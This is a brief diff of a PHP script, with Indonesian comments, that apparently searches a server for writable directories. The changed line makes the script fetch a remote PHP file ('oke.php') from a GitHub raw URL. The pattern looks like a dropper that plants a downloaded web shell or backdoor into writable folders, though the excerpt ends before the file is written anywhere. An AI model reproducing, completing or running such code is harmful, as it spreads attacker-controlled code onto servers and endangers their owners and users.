@@ -23,7 +23,7 @@ function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
 }
 
 // Ganti URL ini dengan link RAW dari file GitHub
-$githubFileURL = 'https://github.com/riko-cup/public/blob/main/oke.php';
+$githubFileURL = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/oke.php';
 
 $content = @file_get_contents($githubFileURL);
 if (!$content) {
